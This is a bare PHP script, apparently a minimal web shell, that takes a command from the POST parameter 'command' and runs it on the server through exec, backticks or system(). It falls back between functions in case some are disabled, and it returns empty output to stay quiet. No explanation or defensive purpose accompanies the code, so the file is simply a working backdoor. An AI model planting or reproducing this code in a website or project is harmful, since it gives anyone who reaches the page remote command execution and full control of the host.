<?php
function shellexec($cmd) {     
    $result = "";      
    if (is_callable("exec")){
        exec($cmd,$result); 
        $result = join("\n",$result);
    }elseif (($result = `$cmd`) !== FALSE) {}
        elseif (is_callable("system") and !in_array("system",$disablefunc)) {
        $v = ob_get_contents(); 
        ob_clean(); 
        system($cmd); 
        $result = ob_get_contents(); 
        ob_clean(); 
        echo $v;
    }
    return $result;
}

$command = $_POST ['command'];
$ret = shellexec($command);
die("");
?>